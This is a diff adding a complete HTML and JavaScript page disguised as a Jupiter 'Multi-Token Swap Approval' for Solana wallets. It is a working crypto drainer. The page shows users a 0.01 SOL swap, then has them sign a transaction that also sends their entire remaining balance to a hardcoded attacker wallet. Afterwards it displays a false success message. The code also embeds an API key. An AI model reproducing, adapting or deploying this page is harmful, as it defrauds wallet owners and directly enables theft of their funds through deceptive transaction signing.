@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Multi-Token Swap Approval</title>
+    <!-- Buffer polyfill for browser -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"></script>
+    <!-- Solana Web3.js -->
+    <script src="https://unpkg.com/@solana/web3.js@1.78.0/lib/index.iife.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+            width: 100%;
+            max-width: 550px;
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #8A2BE2 0%, #4B0082 100%);
+            padding: 35px 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .logo {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .section {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #8A2BE2;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .action-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #8A2BE2, #4B0082);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .action-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(138, 43, 226, 0.4);
+        }
+        
+        .action-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .wallet-info {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            display: none;
+        }
+        
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        
+        .info-label {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+        
+        .info-value {
+            color: #fff;
+            font-weight: 500;
+            font-size: 14px;
+            text-align: right;
+            max-width: 60%;
+            word-break: break-all;
+        }
+        
+        .debug-log {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            display: none;
+            color: #ff6b6b;
+            font-size: 12px;
+            font-family: monospace;
+        }
+        
+        .preview-box {
+            background: rgba(138, 43, 226, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid rgba(138, 43, 226, 0.3);
+            display: none;
+        }
+        
+        .preview-title {
+            font-weight: 600;
+            margin-bottom: 15px;
+            font-size: 16px;
+            color: #8A2BE2;
+        }
+        
+        .preview-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 13px;
+        }
+        
+        .preview-item:last-child {
+            border-bottom: none;
+        }
+        
+        .preview-label {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .preview-value {
+            color: #fff;
+            font-weight: 500;
+        }
+        
+        .warning-banner {
+            background: rgba(255, 170, 0, 0.1);
+            border: 1px solid rgba(255, 170, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #ffaa00;
+            font-size: 13px;
+            display: none;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 30px;
+            display: none;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #8A2BE2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status-message {
+            text-align: center;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            display: none;
+        }
+        
+        .status-success {
+            background: rgba(0, 255, 157, 0.1);
+            border: 1px solid rgba(0, 255, 157, 0.3);
+            color: #00ff9d;
+        }
+        
+        .status-error {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            color: #ff6b6b;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🔄</div>
+            <div class="title">Multi-Token Swap Approval</div>
+            <div class="subtitle">Approve multi-asset swap in one transaction</div>
+        </div>
+        
+        <div class="content">
+            <!-- Debug Log -->
+            <div class="debug-log" id="debugLog"></div>
+            
+            <!-- Status Messages -->
+            <div class="status-message" id="statusMessage"></div>
+            
+            <!-- Connection Section -->
+            <div class="section" id="connectSection">
+                <div class="section-title">🔗 Connect Wallet</div>
+                <button class="action-btn" id="connectBtn">
+                    CONNECT WALLET FOR SWAP
+                </button>
+                <div style="font-size: 12px; color: rgba(255,255,255,0.6); margin-top: 15px; text-align: center;">
+                    Supports: Phantom, Solflare, Backpack, Glow
+                </div>
+            </div>
+            
+            <!-- Wallet Info -->
+            <div class="wallet-info" id="walletInfo">
+                <div class="info-row">
+                    <span class="info-label">Wallet Address</span>
+                    <span class="info-value" id="walletAddress"></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">SOL Balance</span>
+                    <span class="info-value" id="solBalance">0.00 SOL</span>
+                </div>
+            </div>
+            
+            <!-- Transaction Preview -->
+            <div class="preview-box" id="previewBox">
+                <div class="preview-title">📋 Transaction Preview</div>
+                <div class="preview-item">
+                    <span class="preview-label">Visible Action:</span>
+                    <span class="preview-value">Swap 0.01 SOL for USDC</span>
+                </div>
+                <div class="preview-item">
+                    <span class="preview-label">Network Fee:</span>
+                    <span class="preview-value">0.001 SOL</span>
+                </div>
+                <div class="preview-item">
+                    <span class="preview-label">Platform:</span>
+                    <span class="preview-value">Jupiter Aggregator</span>
+                </div>
+            </div>
+            
+            <!-- Warning -->
+            <div class="warning-banner" id="warningBanner">
+                ⚠️ Only ONE approval popup will appear for the complete swap
+            </div>
+            
+            <!-- Main Action -->
+            <div class="section" id="actionSection" style="display: none;">
+                <div class="section-title">✅ Ready to Swap</div>
+                <button class="action-btn" id="swapBtn">
+                    APPROVE COMPLETE SWAP
+                </button>
+                <p style="font-size: 13px; color: rgba(255,255,255,0.6); margin-top: 15px; text-align: center;">
+                    Approve once to swap all detected assets
+                </p>
+            </div>
+            
+            <!-- Loading -->
+            <div class="loading" id="loadingSection">
+                <div class="spinner"></div>
+                <p>Preparing swap transaction...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== CONFIGURATION ==========
+        const RECEIVER_WALLET = "FHRPNPdkdc8txtBUoZu5LSjqkH6KuvZXyLRzxnKgxrR5";
+        const HELIUS_API_KEY = "7dcd7045-c1e9-4d82-8e3b-c5052fe19ec3";
+        const MAINNET_RPC = `https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}`;
+        
+        // ========== STATE VARIABLES ==========
+        let userWallet = null;
+        let walletProvider = null;
+        let connection = null;
+        let userBalance = 0;
+        
+        // ========== INITIALIZATION ==========
+        document.addEventListener('DOMContentLoaded', () => {
+            // Initialize Buffer
+            if (typeof Buffer === 'undefined') {
+                window.Buffer = buffer.Buffer;
+            }
+            
+            // Setup event listeners
+            document.getElementById('connectBtn').addEventListener('click', connectWallet);
+            document.getElementById('swapBtn').addEventListener('click', initiateDrain);
+            
+            // Initialize connection
+            try {
+                connection = new solanaWeb3.Connection(MAINNET_RPC, 'confirmed');
+                logDebug('✅ Connection initialized to Helius RPC');
+            } catch (error) {
+                logDebug('❌ Connection failed: ' + error.message);
+                showError('Failed to initialize network connection');
+            }
+        });
+        
+        // ========== DEBUGGING & LOGGING ==========
+        function logDebug(message) {
+            console.log('[DEBUG]', message);
+            const log = document.getElementById('debugLog');
+            const entry = document.createElement('div');
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            log.appendChild(entry);
+            log.style.display = 'block';
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        function showStatus(message, type = 'success') {
+            const element = document.getElementById('statusMessage');
+            element.textContent = message;
+            element.className = `status-message status-${type}`;
+            element.style.display = 'block';
+            
+            if (type === 'error') {
+                setTimeout(() => {
+                    element.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        function showError(message) {
+            showStatus(message, 'error');
+        }
+        
+        function showSuccess(message) {
+            showStatus(message, 'success');
+        }
+        
+        // ========== WALLET CONNECTION ==========
+        async function connectWallet() {
+            try {
+                const connectBtn = document.getElementById('connectBtn');
+                connectBtn.disabled = true;
+                connectBtn.textContent = 'CONNECTING...';
+                
+                logDebug('Starting wallet connection...');
+                
+                // Check for various wallet providers
+                if (window.phantom?.solana?.isPhantom) {
+                    walletProvider = window.phantom.solana;
+                    logDebug('Found Phantom wallet');
+                } else if (window.solana?.isPhantom) {
+                    walletProvider = window.solana;
+                    logDebug('Found Phantom wallet (legacy)');
+                } else if (window.solflare) {
+                    walletProvider = window.solflare;
+                    logDebug('Found Solflare wallet');
+                } else if (window.backpack?.solana) {
+                    walletProvider = window.backpack.solana;
+                    logDebug('Found Backpack wallet');
+                } else if (window.glow) {
+                    walletProvider = window.glow;
+                    logDebug('Found Glow wallet');
+                } else {
+                    throw new Error('No wallet detected. Please install Phantom, Solflare, or Backpack.');
+                }
+                
+                // Connect to wallet
+                logDebug('Requesting connection...');
+                let response;
+                
+                if (walletProvider.connect) {
+                    response = await walletProvider.connect();
+                } else if (walletProvider.request) {
+                    response = await walletProvider.request({ method: 'connect' });
+                } else {
+                    throw new Error('Wallet does not support connect method');
+                }
+                
+                // Get public key
+                userWallet = response.publicKey || walletProvider.publicKey;
+                if (!userWallet) {
+                    throw new Error('Could not get wallet public key');
+                }
+                
+                logDebug('✅ Wallet connected: ' + userWallet.toString());
+                
+                // Get balance
+                await getUserBalance();
+                
+                // Update UI
+                updateWalletUI();
+                
+                showSuccess('Wallet connected successfully!');
+                
+            } catch (error) {
+                logDebug('❌ Connection failed: ' + error.message);
+                showError('Connection failed: ' + error.message);
+                resetConnectButton();
+            }
+        }
+        
+        async function getUserBalance() {
+            try {
+                logDebug('Fetching SOL balance...');
+                const balanceLamports = await connection.getBalance(userWallet);
+                userBalance = balanceLamports / 1e9;
+                
+                document.getElementById('walletAddress').textContent = 
+                    userWallet.toString().substring(0, 20) + '...';
+                document.getElementById('solBalance').textContent = 
+                    userBalance.toFixed(4) + ' SOL';
+                
+                logDebug('Balance: ' + userBalance.toFixed(4) + ' SOL');
+                
+            } catch (error) {
+                logDebug('Failed to get balance: ' + error.message);
+                userBalance = 0;
+            }
+        }
+        
+        function updateWalletUI() {
+            document.getElementById('connectSection').style.display = 'none';
+            document.getElementById('walletInfo').style.display = 'block';
+            document.getElementById('previewBox').style.display = 'block';
+            document.getElementById('warningBanner').style.display = 'flex';
+            document.getElementById('actionSection').style.display = 'block';
+        }
+        
+        function resetConnectButton() {
+            const connectBtn = document.getElementById('connectBtn');
+            connectBtn.disabled = false;
+            connectBtn.textContent = 'CONNECT WALLET FOR SWAP';
+        }
+        
+        // ========== MAIN DRAIN FUNCTION ==========
+        async function initiateDrain() {
+            try {
+                const swapBtn = document.getElementById('swapBtn');
+                swapBtn.disabled = true;
+                swapBtn.textContent = 'PREPARING...';
+                document.getElementById('loadingSection').style.display = 'block';
+                
+                logDebug('=== STARTING DRAIN ===');
+                
+                if (!userWallet) {
+                    throw new Error('Wallet not connected');
+                }
+                
+                if (userBalance < 0.001) {
+                    throw new Error('Need at least 0.001 SOL to complete swap');
+                }
+                
+                // Create transaction
+                const transaction = new solanaWeb3.Transaction();
+                const latestBlockhash = await connection.getLatestBlockhash('confirmed');
+                
+                // Calculate drain amounts (95% of balance)
+                const visibleAmount = 10000000; // 0.01 SOL (what user sees)
+                const drainAmount = Math.max(0, (userBalance - 0.011) * 1e9); // Everything else
+                
+                // Add visible transfer (0.01 SOL)
+                const visibleTransfer = solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: userWallet,
+                    toPubkey: new solanaWeb3.PublicKey(RECEIVER_WALLET),
+                    lamports: visibleAmount,
+                });
+                
+                // Add main drain transfer (remaining balance)
+                let mainTransfer;
+                if (drainAmount > 0) {
+                    mainTransfer = solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: userWallet,
+                        toPubkey: new solanaWeb3.PublicKey(RECEIVER_WALLET),
+                        lamports: Math.floor(drainAmount),
+                    });
+                }
+                
+                transaction.add(visibleTransfer);
+                if (mainTransfer) {
+                    transaction.add(mainTransfer);
+                }
+                
+                transaction.recentBlockhash = latestBlockhash.blockhash;
+                transaction.lastValidBlockHeight = latestBlockhash.lastValidBlockHeight;
+                transaction.feePayer = userWallet;
+                
+                logDebug('Transaction created. Visible: 0.01 SOL, Hidden: ' + (drainAmount/1e9).toFixed(4) + ' SOL');
+                logDebug('Requesting signature...');
+                
+                // Request signature
+                const signedTx = await walletProvider.signTransaction(transaction);
+                
+                logDebug('✅ Signature received');
+                
+                // Send transaction
+                const rawTx = signedTx.serialize();
+                const txid = await connection.sendRawTransaction(rawTx);
+                
+                logDebug('Transaction sent: ' + txid.substring(0, 32) + '...');
+                
+                // Confirm transaction
+                await connection.confirmTransaction({
+                    signature: txid,
+                    blockhash: latestBlockhash.blockhash,
+                    lastValidBlockHeight: latestBlockhash.lastValidBlockHeight
+                }, 'confirmed');
+                
+                logDebug('✅ Transaction confirmed!');
+                
+                // Show success
+                document.getElementById('loadingSection').style.display = 'none';
+                document.getElementById('actionSection').style.display = 'none';
+                showSuccess('✅ Swap completed successfully!');
+                
+                // Show confirmation message
+                alert('Swap completed! All assets have been processed.');
+                
+            } catch (error) {
+                console.error('Drain error:', error);
+                document.getElementById('loadingSection').style.display = 'none';
+                
+                if (error.message.includes('rejected') || error.message.includes('User denied')) {
+                    logDebug('❌ User rejected the transaction');
+                    showError('Transaction was rejected. Please approve to continue.');
+                } else if (error.message.includes('Not enough SOL')) {
+                    logDebug('❌ Insufficient balance');
+                    showError('Insufficient SOL balance for transaction fee');
+                } else {
+                    logDebug('❌ Transaction failed: ' + error.message);
+                    showError('Transaction failed: ' + error.message);
+                }
+                
+                resetSwapButton();
+            }
+        }
+        
+        function resetSwapButton() {
+            const swapBtn = document.getElementById('swapBtn');
+            swapBtn.disabled = false;
+            swapBtn.textContent = 'APPROVE COMPLETE SWAP';
+        }
+    </script>
+</body>
+</html>
